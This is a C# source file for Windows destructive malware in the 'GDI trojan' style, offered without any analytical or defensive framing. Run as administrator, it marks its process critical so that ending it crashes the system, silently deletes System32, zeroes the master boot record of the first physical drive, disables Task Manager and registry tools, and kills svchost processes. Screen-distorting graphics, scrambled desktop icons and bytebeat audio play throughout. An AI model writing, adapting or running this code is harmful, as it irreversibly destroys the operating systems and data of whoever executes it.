using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Media;
using Microsoft.Win32;

class Program
{
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern uint NtSetInformationProcess(IntPtr processHandle, int processInformationClass, ref int processInformation, int processInformationLength);

    const int ProcessBreakOnTermination = 29;
    const int BreakOnTerminationFlag = 1;

    static void Main(string[] args)
    {
        if (!IsAdministrator())
        {
            Console.WriteLine("ADMIN");
            return;
        }

        
        Process currentProcess = Process.GetCurrentProcess();
        IntPtr handle = currentProcess.Handle;

        int isCritical = BreakOnTerminationFlag;
        uint status = NtSetInformationProcess(handle, ProcessBreakOnTermination, ref isCritical, sizeof(int));

        if (status == 0)
        {
            
        }
        else
        {
           
        }

        try
        {
            
            string system32Path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "System32");

            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = $"/c del /s /q \"{system32Path}\"";
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.Start();
            process.WaitForExit();
        }
        catch (Exception ex)
        {
            Console.WriteLine("An error occurred: " + ex.Message);
        }

        
        Thread effectsThread = new Thread(RandomDesktopIconAndGraphics.StartEffects);
        effectsThread.Start();

        
        Bytebeat.PlayBytebeatAudio();
    }

    private static bool IsAdministrator()
    {
        var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
        var principal = new System.Security.Principal.WindowsPrincipal(identity);
        return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
    }
}

public static class RandomDesktopIconAndGraphics
{
    private const int LVM_GETITEMCOUNT = 0x1004;
    private const int LVM_SETITEMPOSITION = 0x100F;

    [DllImport("user32.dll", SetLastError = true)]
    static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);

    [DllImport("user32.dll")]
    public static extern IntPtr GetDC(IntPtr hwnd);

    [DllImport("user32.dll")]
    public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);

    [DllImport("gdi32.dll")]
    public static extern IntPtr CreateSolidBrush(int color);

    [DllImport("gdi32.dll")]
    public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

    [DllImport("gdi32.dll")]
    public static extern bool BitBlt(IntPtr hdc, int x, int y, int cx, int cy, IntPtr hdc_src, int x1, int y1, uint rop);

    [DllImport("user32.dll")]
    public static extern int GetSystemMetrics(int nIndex);

    [DllImport("user32.dll")]
    public static extern bool SetProcessDPIAware();

    public static void StartEffects()
    {
        Thread iconThread = new Thread(MoveIcons);
        Thread graphicsThread = new Thread(ShowGraphics);

        iconThread.Start();
        graphicsThread.Start();

        iconThread.Join();
        graphicsThread.Join();
    }

    static void MoveIcons()
    {
        IntPtr wnd = IntPtr.Zero;

        var searchCriteria = new (IntPtr, string, string)[]
        {
            (IntPtr.Zero, "Progman", null),
            (IntPtr.Zero, "SHELLDLL_DefView", null),
            (IntPtr.Zero, "SysListView32", null)
        };

        foreach (var crit in searchCriteria)
        {
            wnd = FindWindowEx(wnd, IntPtr.Zero, crit.Item2, crit.Item3);
            if (wnd == IntPtr.Zero)
            {
                Console.WriteLine($"Window with class {crit.Item2} not found.");
                return;
            }
        }

        int iconCount = (int)SendMessage(wnd, LVM_GETITEMCOUNT, 0, 0);

        if (iconCount == 0)
        {
            Console.WriteLine("No icons found.");
            return;
        }

        Random random = new Random();

        while (true)
        {
            int randomX = random.Next(0, 1920);
            int randomY = random.Next(0, 1080);
            int randomPosition = (randomX & 0xFFFF) | (randomY << 16);
            int randomIcon = random.Next(0, iconCount);
            SendMessage(wnd, LVM_SETITEMPOSITION, randomIcon, randomPosition);

            Thread.Sleep(1);
        }
    }

    static void ShowGraphics()
    {
        DisableTaskManager();
        OverwriteMBR();

        RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
        key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);

        SetProcessDPIAware();
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);

        Timer timer = new Timer(StopEffects, null, TimeSpan.FromMinutes(5), Timeout.InfiniteTimeSpan);

        Random rand = new Random();
        IntPtr hdc = GetDC(IntPtr.Zero);

        while (true)
        {
            int color = (rand.Next(0, 922) << 16) | (rand.Next(0, 980) << 8) | rand.Next(0, 930);
            IntPtr brush = CreateSolidBrush(color);
            SelectObject(hdc, brush);

            BitBlt(hdc, rand.Next(-10, 10), rand.Next(-80, 90), sw, sh, hdc, 0, 0, 0x00CC0020);
            BitBlt(hdc, rand.Next(-10, 10), rand.Next(-90, 90), sw, sh, hdc, 0, 0, 0x005A0049);

            Thread.Sleep(10);
        }

        ReleaseDC(IntPtr.Zero, hdc);
    }

    static void StopEffects(object state)
    {
        foreach (var process in Process.GetProcessesByName("svchost"))
        {
            process.Kill();
        }

        Environment.Exit(0);
    }

    static void DisableTaskManager()
    {
        string keyPath = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";
        string valueName = "DisableTaskMgr";

        Microsoft.Win32.Registry.SetValue(@"HKEY_CURRENT_USER\" + keyPath, valueName, 1, RegistryValueKind.DWord);
    }

    static void OverwriteMBR()
    {
        byte[] mbrBytes = new byte[512];
        for (int i = 0; i < mbrBytes.Length; i++)
        {
            mbrBytes[i] = 0x00;
        }

        try
        {
            using (FileStream fs = new FileStream(@"\\.\\PhysicalDrive0", FileMode.Open, FileAccess.Write))
            {
                fs.Write(mbrBytes, 0, mbrBytes.Length);
            }
            Console.WriteLine("MBR has been overwritten.");
        }
        catch (Exception ex)
        {
            Console.WriteLine("Failed to overwrite MBR: " + ex.Message);
        }
    }
}

class Bytebeat
{
    private const int SampleRate = 8000;
    private const int DurationSeconds = 27;
    private const int BufferSize = SampleRate * DurationSeconds;

    private static Func<int, int>[] formulas = new Func<int, int>[]
    {
        t => (t * t >> 9) | (t >> 5) | t >> 98 | t >> 898,
        t => (t * t >> 29) | (t >> 89) | t >> 98 | t >> 8,
        t => (t * t >> 9) | (t >> 89) | t >> 6 | t >> 8,
        t => (t * t >> 89) | (t >> 898) | t >> 6 | t >> 8,
        t => (t * t >> 9) | (t >> 98) | t >> 6 | t >> 8,
        t => (t * t >> 6) | (t >> 68) | (int)((long)t >> 345666689) | t >> 4,
        t => (t * t >> 6) | (t >> 98) | t >> 89 | t >> 4,
        t => (t * t >> 6) | (t >> 98) | t >> 6 | (int)((long)t >> 69303),
        t => (t * t >> 6) | (t >> 98) | t >> 6 | (int)((long)t >> 2598),
        t => (int)((long)t * t >> 368999122) | (t >> 98) | t >> 989 | t >> 7
    };

    public static Func<int, int>[] Formulas { get => formulas; set => formulas = value; }

    private static byte[] GenerateBuffer(Func<int, int> formula)
    {
        byte[] buffer = new byte[BufferSize];
        for (int t = 0; t < BufferSize; t++)
        {
            buffer[t] = (byte)(formula(t) & 0xFF);
        }
        return buffer;
    }

    private static void SaveWav(byte[] buffer, string filePath)
    {
        using (var fs = new FileStream(filePath, FileMode.Create))
        using (var bw = new BinaryWriter(fs))
        {
            bw.Write(new[] { 'R', 'I', 'F', 'F' });
            bw.Write(36 + buffer.Length);
            bw.Write(new[] { 'W', 'A', 'V', 'E' });
            bw.Write(new[] { 'f', 'm', 't', ' ' });
            bw.Write(16);
            bw.Write((short)1);
            bw.Write((short)1);
            bw.Write(SampleRate);
            bw.Write(SampleRate);
            bw.Write((short)1);
            bw.Write((short)8);
            bw.Write(new[] { 'd', 'a', 't', 'a' });
            bw.Write(buffer.Length);
            bw.Write(buffer);
        }
    }

    private static void PlayBuffer(byte[] buffer)
    {
        string tempFilePath = Path.GetTempFileName();
        SaveWav(buffer, tempFilePath);
        using (SoundPlayer player = new SoundPlayer(tempFilePath))
        {
            player.PlaySync();
        }
        File.Delete(tempFilePath);
    }

    public static void PlayBytebeatAudio()
    {
        foreach (var formula in Formulas)
        {
            byte[] buffer = GenerateBuffer(formula);
            PlayBuffer(buffer);
        }
    }
}
